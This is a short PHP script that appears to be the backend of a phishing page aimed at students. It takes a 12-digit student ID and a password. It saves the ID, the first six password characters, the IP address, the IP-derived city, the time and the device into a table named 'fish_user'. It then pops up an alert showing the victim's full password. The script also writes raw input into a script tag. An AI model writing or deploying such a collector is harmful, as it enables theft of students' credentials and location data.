<?php
require_once './include/common.php';
$username = daddslashes($_POST['yhm']);
if(strlen($username)!=12){
    die("<script>alert('请输入正确的学号');history.back();</script>");
}
$pass = daddslashes($_POST['mm']);
if(strlen($pass)>6){
    $password = substr($pass,0,6).str_repeat("*",strlen($pass)-6);
}else{
    $password = $pass;
}
if (!empty($username) and !empty($pass)) {
    $realip = real_ip();
    $ipcount = $DB->count("SELECT count(*) from fish_user where ip='$realip'");
    if ($ipcount < 3) {
        $address = getCity($realip);
        $time = date("Y-m-d H:i:s");
        $ua = $_SERVER['HTTP_USER_AGENT'];
        $device = get_device($ua);
        $sql = "INSERT INTO `fish_user`(`username`, `password`, `ip`, `address`, `time`, `device`) VALUES ('{$username}','{$password}','{$realip}','{$address}','{$time}','{$device}')";
        $DB->query($sql);
    }
    echo("<script>alert('你的密码是:$pass')</script>");
}else{
    echo("<script>alert('用户名或密码不能为空')</script>");
}
echo("<script>history.back();</script>");
